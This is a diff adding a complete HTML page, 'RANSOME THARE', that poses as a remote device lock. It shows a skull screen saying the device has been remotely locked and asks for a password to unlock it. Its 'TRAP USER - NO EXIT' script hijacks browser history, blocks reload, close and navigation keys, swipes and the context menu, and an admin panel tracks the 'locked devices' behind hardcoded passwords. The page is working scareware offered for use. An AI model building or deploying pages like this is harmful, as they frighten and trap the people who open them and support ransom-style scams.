@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>RANSOME THARE - Device Locked</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
+            min-height: 100vh;
+            color: white;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* LOCK SCREEN */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 25px;
+        }
+
+        .skull {
+            font-size: 100px;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 0 20px red);
+            animation: shake 0.5s infinite;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .skull:active {
+            transform: scale(0.95);
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        h1 {
+            font-size: 34px;
+            margin-bottom: 10px;
+            color: #ff4444;
+            letter-spacing: 2px;
+        }
+
+        .sub {
+            opacity: 0.6;
+            margin-bottom: 40px;
+            font-size: 14px;
+        }
+
+        .message-box {
+            background: rgba(255,255,255,0.08);
+            padding: 25px;
+            border-radius: 25px;
+            width: 85%;
+            border: 1px solid rgba(255,0,0,0.3);
+        }
+
+        .label {
+            font-size: 13px;
+            letter-spacing: 2px;
+            margin-bottom: 12px;
+            color: #ff9800;
+        }
+
+        .device-id {
+            font-size: 24px;
+            font-weight: bold;
+            font-family: monospace;
+            background: rgba(0,0,0,0.5);
+            padding: 12px;
+            border-radius: 12px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .device-id:active {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 30px;
+            font-size: 11px;
+            opacity: 0.4;
+        }
+
+        /* Admin Panel */
+        .admin-panel {
+            display: none;
+            padding: 20px;
+            height: 100vh;
+            overflow-y: auto;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255,255,255,0.1);
+            padding: 15px 20px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .admin-header h1 {
+            font-size: 20px;
+            color: #ff9800;
+            margin: 0;
+        }
+
+        .logout-btn {
+            background: #dc3545;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(0,0,0,0.5);
+            padding: 18px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat .number {
+            font-size: 34px;
+            font-weight: bold;
+            color: #ff9800;
+        }
+
+        .stat .label {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+
+        .device-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .device-card h3 {
+            margin-bottom: 15px;
+            color: #ff9800;
+        }
+
+        .device-list {
+            max-height: 350px;
+            overflow-y: auto;
+        }
+
+        .device-item {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .device-info .device-id {
+            font-family: monospace;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .device-info .status {
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 20px;
+            background: #dc3545;
+            margin-top: 5px;
+            display: inline-block;
+        }
+
+        .force-unlock-btn {
+            background: #ff9800;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 40px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .add-section {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .add-section input {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 40px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .add-section button {
+            padding: 12px 20px;
+            background: #2196F3;
+            border: none;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Unlock Password Modal */
+        .password-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .password-box {
+            background: linear-gradient(145deg, #1e1e3a, #0f0f2a);
+            border-radius: 30px;
+            padding: 35px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+            border: 2px solid #ff9800;
+        }
+
+        .password-box h2 {
+            color: #ff9800;
+            margin-bottom: 20px;
+            font-size: 26px;
+        }
+
+        .password-box input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 50px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 5px;
+            background: white;
+        }
+
+        .password-box button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .password-box button.cancel {
+            background: #555;
+        }
+
+        .pass-error {
+            color: #ff5555;
+            margin-top: 12px;
+            display: none;
+        }
+
+        /* Admin Login Modal */
+        .admin-login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 4000;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LOCK SCREEN -->
+    <div id="lockScreen" class="lock-screen">
+        <div class="skull" id="skullBtn" onclick="showUnlockPopup()">💀</div>
+        <h1>DEVICE LOCKED</h1>
+        <div class="sub">This device has been remotely locked</div>
+        <div class="message-box">
+            <div class="label">🔒 DEVICE ID</div>
+            <div class="device-id" id="lockedDeviceId" onclick="showUnlockPopup()">----</div>
+        </div>
+        <div class="footer">⚠️ Tap on skull or device ID to unlock</div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div id="adminPanel" class="admin-panel">
+        <div class="admin-header">
+            <h1>👑 RANSOME THARE - ADMIN PANEL</h1>
+            <button class="logout-btn" onclick="adminLogout()">LOGOUT</button>
+        </div>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="number" id="totalDevices">0</div>
+                <div class="label">Total Devices</div>
+            </div>
+            <div class="stat">
+                <div class="number" id="lockedDevices">0</div>
+                <div class="label">Locked</div>
+            </div>
+        </div>
+
+        <div class="device-card">
+            <h3>📱 LOCKED DEVICES</h3>
+            <div class="device-list" id="deviceList">
+                <p style="text-align:center;opacity:0.6;">No locked devices</p>
+            </div>
+            <div class="add-section">
+                <input type="text" id="newDeviceId" placeholder="New Device ID (or auto)">
+                <button onclick="addDevice()">➕ ADD</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- UNLOCK PASSWORD MODAL (for user) -->
+    <div id="unlockModal" class="password-modal">
+        <div class="password-box">
+            <div style="font-size: 50px; margin-bottom: 10px;">🔐</div>
+            <h2>ENTER PASSWORD</h2>
+            <input type="password" id="unlockPassInput" maxlength="6" placeholder="******" autocomplete="off">
+            <button onclick="verifyUserUnlock()">UNLOCK</button>
+            <button class="cancel" onclick="closeUnlockModal()">CANCEL</button>
+            <div id="unlockError" class="pass-error">❌ Wrong password!</div>
+        </div>
+    </div>
+
+    <!-- ADMIN LOGIN MODAL -->
+    <div id="adminLoginModal" class="admin-login-modal">
+        <div class="password-box">
+            <h2>👑 ADMIN LOGIN</h2>
+            <input type="password" id="adminPassInput" placeholder="Enter password" autocomplete="off">
+            <button onclick="verifyAdminLogin()">LOGIN</button>
+            <div id="adminError" class="pass-error">❌ Wrong password!</div>
+        </div>
+    </div>
+
+    <script>
+        // ========== PASSWORDS ==========
+        const ADMIN_PASSWORD = "8708250548";
+        const USER_UNLOCK_PASSWORD = "809080";  // 6-digit password for user to unlock
+        
+        // ========== DATA ==========
+        let lockedDevices = JSON.parse(localStorage.getItem('ransome_devices') || '[]');
+        let isAdminLoggedIn = localStorage.getItem('ransome_admin') === 'true';
+        let currentDeviceId = localStorage.getItem('ransome_current_device') || null;
+
+        // ========== GENERATE DEVICE ID ==========
+        function generateDeviceId() {
+            return 'DEV-' + Math.floor(10000 + Math.random() * 90000).toString();
+        }
+
+        // ========== SAVE & UPDATE ==========
+        function saveDevices() {
+            localStorage.setItem('ransome_devices', JSON.stringify(lockedDevices));
+            updateAdminList();
+        }
+
+        function updateAdminList() {
+            if (!isAdminLoggedIn) return;
+            
+            document.getElementById('totalDevices').innerText = lockedDevices.length;
+            document.getElementById('lockedDevices').innerText = lockedDevices.length;
+            
+            const container = document.getElementById('deviceList');
+            if (lockedDevices.length === 0) {
+                container.innerHTML = '<p style="text-align:center;opacity:0.6;">No locked devices</p>';
+            } else {
+                container.innerHTML = '';
+                lockedDevices.forEach(device => {
+                    const div = document.createElement('div');
+                    div.className = 'device-item';
+                    div.innerHTML = `
+                        <div class="device-info">
+                            <div class="device-id">🔒 ${device.id}</div>
+                            <div class="status">LOCKED</div>
+                        </div>
+                        <button class="force-unlock-btn" onclick="forceUnlockDevice('${device.id}')">🔓 FORCE UNLOCK</button>
+                    `;
+                    container.appendChild(div);
+                });
+            }
+        }
+
+        // ========== ADD DEVICE ==========
+        function addDevice() {
+            let id = document.getElementById('newDeviceId').value.trim();
+            if (!id) {
+                id = generateDeviceId();
+            }
+            if (id.length < 4) {
+                alert('ID must be at least 4 characters!');
+                return;
+            }
+            if (lockedDevices.find(d => d.id === id)) {
+                alert('Device already exists!');
+                return;
+            }
+            lockedDevices.push({ id: id, lockedAt: new Date().toISOString() });
+            saveDevices();
+            alert(`✅ Device ${id} added to lock list!`);
+            document.getElementById('newDeviceId').value = '';
+        }
+
+        // ========== USER UNLOCK (from lock screen) ==========
+        function showUnlockPopup() {
+            document.getElementById('unlockModal').style.display = 'flex';
+            document.getElementById('unlockPassInput').value = '';
+            document.getElementById('unlockError').style.display = 'none';
+        }
+
+        function closeUnlockModal() {
+            document.getElementById('unlockModal').style.display = 'none';
+        }
+
+        function verifyUserUnlock() {
+            const enteredPass = document.getElementById('unlockPassInput').value;
+            
+            if (enteredPass === USER_UNLOCK_PASSWORD) {
+                closeUnlockModal();
+                // Remove current device from lock list
+                if (currentDeviceId) {
+                    lockedDevices = lockedDevices.filter(d => d.id !== currentDeviceId);
+                    saveDevices();
+                }
+                alert('✅ Device unlocked successfully! Closing browser...');
+                setTimeout(() => {
+                    window.close();
+                    window.location.href = 'about:blank';
+                }, 500);
+            } else {
+                document.getElementById('unlockError').style.display = 'block';
+            }
+        }
+
+        // ========== ADMIN FORCE UNLOCK ==========
+        function forceUnlockDevice(deviceId) {
+            const deviceExists = lockedDevices.find(d => d.id === deviceId);
+            if (!deviceExists) {
+                alert(`❌ Device ${deviceId} not found!`);
+                return;
+            }
+            
+            lockedDevices = lockedDevices.filter(d => d.id !== deviceId);
+            saveDevices();
+            
+            alert(`✅ Device ${deviceId} has been UNLOCKED! Browser will close.`);
+            
+            if (currentDeviceId === deviceId) {
+                setTimeout(() => {
+                    window.close();
+                    window.location.href = 'about:blank';
+                }, 500);
+            }
+        }
+
+        // ========== ADMIN FUNCTIONS ==========
+        function showAdminLogin() {
+            document.getElementById('adminLoginModal').style.display = 'flex';
+            document.getElementById('adminPassInput').value = '';
+            document.getElementById('adminError').style.display = 'none';
+        }
+
+        function closeAdminLoginModal() {
+            document.getElementById('adminLoginModal').style.display = 'none';
+        }
+
+        function verifyAdminLogin() {
+            const pass = document.getElementById('adminPassInput').value;
+            if (pass === ADMIN_PASSWORD) {
+                isAdminLoggedIn = true;
+                localStorage.setItem('ransome_admin', 'true');
+                closeAdminLoginModal();
+                showAdminPanel();
+            } else {
+                document.getElementById('adminError').style.display = 'block';
+            }
+        }
+
+        function adminLogout() {
+            isAdminLoggedIn = false;
+            localStorage.removeItem('ransome_admin');
+            location.reload();
+        }
+
+        function showAdminPanel() {
+            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('lockScreen').style.display = 'none';
+            updateAdminList();
+        }
+
+        function showLockScreen(deviceId) {
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('lockScreen').style.display = 'flex';
+            document.getElementById('lockedDeviceId').innerText = deviceId;
+            
+            document.body.style.overflow = 'hidden';
+            document.body.style.position = 'fixed';
+            window.history.pushState(null, '', window.location.href);
+        }
+
+        // ========== TRAP USER - NO EXIT ==========
+        window.addEventListener('popstate', function() {
+            if (currentDeviceId) {
+                window.history.pushState(null, '', window.location.href);
+                alert('🔒 DEVICE LOCKED! Tap on skull to unlock with password.');
+            }
+        });
+
+        window.addEventListener('beforeunload', function(e) {
+            if (currentDeviceId) {
+                e.preventDefault();
+                e.returnValue = '🔒 DEVICE IS LOCKED!';
+                return '🔒 DEVICE IS LOCKED!';
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (currentDeviceId) {
+                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'Meta', 'Alt', 'Tab'];
+                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
+                    e.preventDefault();
+                    alert('🔒 Action blocked! Tap on skull to unlock.');
+                    return false;
+                }
+            }
+        });
+
+        let startX = 0;
+        document.addEventListener('touchstart', function(e) {
+            if (currentDeviceId) startX = e.touches[0].clientX;
+        });
+        document.addEventListener('touchend', function(e) {
+            if (currentDeviceId) {
+                const endX = e.changedTouches[0].clientX;
+                if (Math.abs(endX - startX) > 50) {
+                    e.preventDefault();
+                    alert('🔒 Swipe blocked! Tap on skull to unlock.');
+                }
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            if (currentDeviceId) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        if (currentDeviceId) {
+            setInterval(() => {
+                if (currentDeviceId) {
+                    window.history.pushState(null, '', window.location.href);
+                }
+            }, 500);
+        }
+
+        // ========== INIT ==========
+        function init() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const deviceId = urlParams.get('id');
+            
+            if (deviceId) {
+                const isLocked = lockedDevices.find(d => d.id === deviceId);
+                if (isLocked) {
+                    currentDeviceId = deviceId;
+                    localStorage.setItem('ransome_current_device', deviceId);
+                    showLockScreen(deviceId);
+                } else {
+                    showAdminLogin();
+                }
+            } else {
+                const newId = generateDeviceId();
+                if (!lockedDevices.find(d => d.id === newId)) {
+                    lockedDevices.push({ id: newId, lockedAt: new Date().toISOString() });
+                    saveDevices();
+                }
+                window.location.href = `?id=${encodeURIComponent(newId)}`;
+            }
+        }
+
+        window.adminLogout = adminLogout;
+        window.addDevice = addDevice;
+        window.forceUnlockDevice = forceUnlockDevice;
+        window.showUnlockPopup = showUnlockPopup;
+        window.closeUnlockModal = closeUnlockModal;
+        window.verifyUserUnlock = verifyUserUnlock;
+        window.showAdminLogin = showAdminLogin;
+        window.verifyAdminLogin = verifyAdminLogin;
+        window.closeAdminLoginModal = closeAdminLoginModal;
+
+        if (isAdminLoggedIn) {
+            showAdminPanel();
+        } else if (currentDeviceId) {
+            showLockScreen(currentDeviceId);
+        } else {
+            init();
+        }
+    </script>
+</body>
+</html>
